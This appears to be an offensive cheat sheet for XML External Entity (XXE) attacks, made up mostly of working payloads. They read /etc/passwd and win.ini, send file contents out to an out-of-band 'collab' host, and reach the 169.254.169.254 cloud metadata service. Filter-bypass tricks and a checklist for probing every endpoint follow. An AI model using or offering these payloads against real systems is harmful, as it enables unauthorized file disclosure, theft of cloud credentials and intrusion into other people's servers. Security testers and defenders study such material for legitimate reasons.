# XXE

XML with an external entity. The parser fetches it.

---

## Detection

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "http://collab/xxe">]>
<r>&x;</r>
```

DNS hit = parser resolves entities.

---

## File read

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

Windows: `file:///c:/windows/win.ini`.

---

## Blind (OOB)

```xml
<!DOCTYPE r [
 <!ENTITY % f SYSTEM "file:///etc/passwd">
 <!ENTITY % d "<!ENTITY &#37; e SYSTEM 'http://collab/?x=%f;'>">
 %d; %e;
]>
<r>ok</r>
```

---

## SSRF via XXE

`SYSTEM "http://169.254.169.254/latest/meta-data/"` — same escalation as SSRF.

---

## Where XML hides

- SOAP endpoints
- SAML assertions
- RSS/Atom import
- SVG upload
- DOCX/XLSX/PPTX (zip + XML)
- sitemap upload
- `Content-Type: application/xml` on any endpoint
- JSON endpoint that also accepts XML

---

## Bypasses

- `Content-Type: text/xml` when `application/xml` is filtered.
- Wrap the XML in a multipart part.
- `<!DOCTYPE` filtered → use a parameter entity in an external DTD.
- PHP `libxml_disable_entity_loader` older versions → `php://filter` in the entity.

---

## Go deeper

1. Try XML on every JSON endpoint.
2. Try SVG upload with an entity.
3. Try DOCX with an entity in `word/document.xml`.
4. Try the metadata URL directly as the entity.
5. Test billion-laughs for DoS separately.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
